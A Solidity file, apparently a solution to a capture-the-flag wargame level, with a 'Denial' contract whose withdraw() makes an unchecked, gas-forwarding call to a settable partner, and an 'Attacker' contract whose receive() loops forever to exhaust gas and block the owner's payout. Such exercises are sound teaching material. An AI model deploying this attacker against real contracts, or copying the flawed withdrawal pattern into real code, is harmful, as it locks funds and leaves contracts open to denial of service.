// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        (bool success, ) = partner.call{value: amountToSend}("");
        if(success) {}

        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    Denial denial;

    constructor(address payable _denialContractAddress) public {
        denial = Denial(_denialContractAddress);
    }

    receive() external payable {
        // Since the purpose is to deny the service, spending all the gas in this receive() function is enough to stop the owner from receiving funds.
        while(true) {

        }
    }
}